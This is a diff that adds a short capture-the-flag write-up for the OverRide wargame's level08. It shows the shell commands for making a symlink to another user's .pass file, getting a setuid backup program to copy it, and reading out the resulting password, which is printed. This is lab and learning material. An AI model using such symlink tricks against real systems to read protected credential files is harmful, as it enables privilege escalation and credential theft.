@@ -1,0 +1,15 @@
+this program will read a file given as input so we can create
+a sym link to get the pass (because otherwise it will generate an error caused by the abspath)
+
+level08@OverRide:~$ ln -s /home/users/level09/.pass test
+ln: accessing `test': Permission denied
+
+and give the permmissions
+
+level08@OverRide:~$ chmod +w .
+level08@OverRide:~$ ln -s /home/users/level09/.pass test
+
+level08@OverRide:~$ ./level08 test
+level08@OverRide:~$ cat backups/test
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
